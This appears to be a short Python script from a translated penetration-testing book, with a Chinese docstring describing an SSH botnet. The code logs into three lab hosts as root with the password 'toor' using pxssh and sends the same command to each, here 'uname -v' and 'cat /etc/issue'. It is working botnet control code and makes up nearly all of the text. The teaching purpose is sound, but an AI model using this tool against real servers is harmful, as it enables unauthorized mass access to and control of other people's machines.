"""
们得到了我们最后的僵尸网络的脚本。这提供了一个
极好的控制大量主机的方法。为了测试，我们生成了 3 台 Backtrack5 的虚拟
主机作为目标。我们可以看到我们的脚本遍历三台主机并发送命令给每个受害
者。SSH 僵尸网络的生成脚本是直接攻击服务器。下一节我们集中在间接攻击
向量位目标，通过脆弱的服务器和另一种方法建立一个集体感染。
"""
import optparse
from pexpect import pxssh
class Client:
 def __init__(self, host, user, password):
    self.host = host
    self.user = user
    self.password = password
    self.session = self.connect()
 def connect(self):
    try:
        s = pxssh.pxssh()
        s.login(self.host, self.user, self.password)
        return s
    except Exception as e:
        print(e)
        print('[-] Error Connecting')
 def send_command(self, cmd):
    self.session.sendline(cmd)
    self.session.prompt()
    return self.session.before
def botnetCommand(command):
 for client in botNet:
    output = client.send_command(command)
    print('[*] Output from ' + client.host)
    print('[+] ' + output + '\n')
def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []
addClient('10.10.10.110', 'root', 'toor')
addClient('10.10.10.120', 'root', 'toor')
addClient('10.10.10.130', 'root', 'toor')
botnetCommand('uname -v')
botnetCommand('cat /etc/issue')